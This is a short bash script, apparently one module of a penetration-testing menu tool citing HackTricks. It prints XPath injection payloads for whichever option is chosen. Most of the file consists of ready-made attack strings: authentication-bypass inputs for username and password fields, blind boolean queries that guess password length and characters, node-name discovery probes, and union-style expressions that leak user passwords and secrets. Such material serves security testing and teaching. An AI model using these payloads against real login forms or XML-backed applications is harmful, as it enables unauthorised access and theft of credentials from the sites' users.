#!/bin/bash
# HackTricks Ref: xpath-injection
# Module: XPath Injection (XML Data Extraction)

echo -e "${C6}[WEB ATTACK: XPATH_INJECTION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/xpath-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select XPath Injection Vector:${NC}"
echo "1) Authentication Bypass (' or 1=1 or ')"
echo "2) Blind XPath Injection (Boolean-based)"
echo "3) Node Name Extraction (Discovery)"
echo "4) Data Extraction (Value leakage)"
echo "0) Exit"

read -p "Selection: " xpath_opt

case $xpath_opt in
    1)
        echo -e "\n${C2}[*] Auth Bypass Payloads:${NC}"
        echo "Goal: Make the XPath query return 'true' regardless of the password."
        echo "Payloads for Username/Password fields:"
        echo "  ' or 1=1 or '"
        echo "  ' or '1'='1"
        echo "  \" or \"1\"=\"1"
        echo "  ' or true() or '"
        ;;
    2)
        echo -e "\n${C2}[*] Blind XPath (Boolean):${NC}"
        echo "Guess the values by checking if the page returns a 'Success' message."
        echo "Test length:   ' or string-length(//user[1]/pass)=8 or '"
        echo "Test content: ' or substring(//user[1]/pass,1,1)='a' or '"
        ;;
    3)
        echo -e "\n${C2}[*] Node Discovery:${NC}"
        echo "Extract the names of the XML tags (nodes):"
        echo "  ' or name(/*[1])='users' or '"
        echo "  ' or name(/*[1]/*[1])='user' or '"
        ;;
    4)
        echo -e "\n${C2}[*] Data Leakage (Union-like):${NC}"
        echo "If the output is reflected, try to concatenate values:"
        echo "  ' | //user/password | '"
        echo "  ' | /accounts/account/secret | '"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
